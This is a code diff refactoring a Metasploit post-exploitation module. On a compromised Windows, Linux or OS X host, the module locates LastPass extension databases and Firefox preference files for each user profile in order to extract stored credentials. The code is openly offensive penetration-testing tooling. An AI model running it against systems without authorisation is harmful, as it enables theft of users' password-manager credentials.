@@ -30,8 +30,8 @@ class Metasploit3 < Msf::Post
 
     print_status "Searching for LastPass databases..."
 
-    db_paths = database_paths # Find databases and get the remote paths
-    if db_paths.size == 0 # Found any database?
+    db_paths = get_database_paths # Find databases and get the remote paths
+    if db_paths.empty?
       print_status "No databases found"
       return
     end
@@ -73,9 +73,9 @@ class Metasploit3 < Msf::Post
   end
 
   # Finds the databases in the victim's machine
-  def database_paths
+  def get_database_paths
     platform = session.platform
-    existing_profiles = user_profiles
+    existing_profiles = get_user_profiles
     found_dbs_paths = []
 
     case platform
@@ -98,10 +98,7 @@ class Metasploit3 < Msf::Post
         # Check Safari
         path = "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
         found_dbs_paths.push(find_db_paths(path, "Safari"))
-
-        print_line ""
       end
-
     when /unix|linux/
       existing_profiles.each do |user_profile|
         print_status "Found user: #{user_profile['UserName']}"
@@ -114,7 +111,6 @@ class Metasploit3 < Msf::Post
         path = "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
         found_dbs_paths.push(find_db_paths(path, "Chrome"))
       end
-
     when /osx/
       existing_profiles.each do |user_profile|
         print_status "Found user: #{user_profile['UserName']}"
@@ -138,7 +134,6 @@ class Metasploit3 < Msf::Post
 
     else
       print_error "platform not recognized: #{platform}"
-      return nil
     end
 
     found_dbs_paths.flatten
@@ -150,53 +145,48 @@ class Metasploit3 < Msf::Post
 
     print_status "Checking in #{browser}..."
     if browser == "Firefox" # Special case for Firefox
-      profiles = profile_paths(path, browser)
-      if profiles
+      profiles = get_firefox_profile_files(path, browser)
+      unless profiles.empty?
         print_good "Found #{profiles.size} profile files in Firefox"
-        profiles.each do |profile_path|
-          file_paths = ["#{profile_path}\\prefs.js"]
-          found_dbs_paths.push(file_paths)
-        end
+        found_dbs_paths |= profiles
       end
     else
-      file_paths = file_paths(path, browser)
-      found_dbs_paths.push(file_paths) unless file_paths.nil?
+      found_dbs_paths |= file_paths(path, browser)
     end
 
     found_dbs_paths
   end
 
   # Returns the relevant information from user profiles
-  def user_profiles
+  def get_user_profiles
+    user_profiles = []
     case session.platform
     when /unix|linux/
-      user_profiles = []
       if session.type == "meterpreter"
         user_names = client.fs.dir.entries("/home")
       else
         user_names = session.shell_command("ls /home").split
       end
+      user_names.reject! { |u| %w(. ..).include?(u) }
       user_names.each do |user_name|
-        user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}") if user_name != '.' &&  user_name != '..'
+        user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}")
       end
-
-      return user_profiles
-
     when /osx/
-      user_profiles = []
       user_names = session.shell_command("ls /Users").split
+      user_names.reject! { |u| u == 'Shared' }
       user_names.each do |user_name|
-        user_profiles.push('UserName' => user_name, "AppData" => "/Users/#{user_name}/Library", "LocalAppData" => "/Users/#{user_name}/Library/Application Support") if user_name != 'Shared'
+        user_profiles.push(
+          'UserName' => user_name,
+          "AppData" => "/Users/#{user_name}/Library",
+          "LocalAppData" => "/Users/#{user_name}/Library/Application Support"
+        )
       end
-
-      return user_profiles
-
     when /win/
-      return grab_user_profiles
+      user_profiles |= grab_user_profiles
     else
       print_error "OS not recognized: #{os}"
-      return nil
     end
+    user_profiles
   end
 
   # Extracts the databases paths from the given folder ignoring . and ..
@@ -218,48 +208,42 @@ class Metasploit3 < Msf::Post
 
       else
         print_error "Session type not recognized: #{session.type}"
-        return nil
+        return found_dbs_paths
       end
     end
 
-    if found_dbs_paths.size > 0
-      print_good "Found #{found_dbs_paths.size} database/s in #{browser}"
-      return found_dbs_paths
-    else
+    if found_dbs_paths.empty?
       print_status "No databases found for #{browser}"
-      return nil
+    else
+      print_good "Found #{found_dbs_paths.size} database/s in #{browser}"
     end
+    found_dbs_paths
   end
 
-  # Returns the profile path for Firefox
-  def profile_paths(path, browser)
+  # Returns the profile files for Firefox
+  def get_firefox_profile_files(path, browser)
     found_dbs_paths = []
 
     if directory?(path)
       if session.type == "meterpreter"
         files = client.fs.dir.entries(path)
-        files.each do |file_path|
-          found_dbs_paths.push(File.join(path, file_path)) if file_path != '.' &&  file_path != '..' && file_path.match(/.*\.default/)
-        end
-
       elsif session.type == "shell"
         files = session.shell_command("ls \"#{path}\"").split
-        files.each do |file_path|
-          found_dbs_paths.push(File.join(path, file_path)) if file_path.match(/.*\.default/)
-        end
-
       else
         print_error "Session type not recognized: #{session.type}"
-        return nil
+        return found_dbs_paths
       end
     end
 
-    if found_dbs_paths.size > 0
-      return found_dbs_paths
-    else
-      print_status "No profile paths found for #{browser}"
-      return nil
+    files.reject! { |file| %w(. ..).include?(file) }
+    files.each do |file_path|
+      found_dbs_paths.push(File.join(path, file_path, 'prefs.js')) if file_path.match(/.*\.default/)
     end
+
+    if found_dbs_paths.empty?
+      print_status "No profile paths found for #{browser}"
+    end
+    found_dbs_paths
   end
 
   # Parses the Firefox preferences file and returns encoded credentials
